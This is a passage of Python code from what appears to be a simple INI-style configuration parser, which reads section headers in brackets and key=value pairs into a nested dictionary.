            continue
        if line.startswith("[") and line.endswith("]"):
            current_section = line[1:-1]
            config[current_section] = {}
        elif "=" in line and current_section:
            key, val = line.split("=", 1)
            config[current_section][key.strip()] = val.strip()
    return config

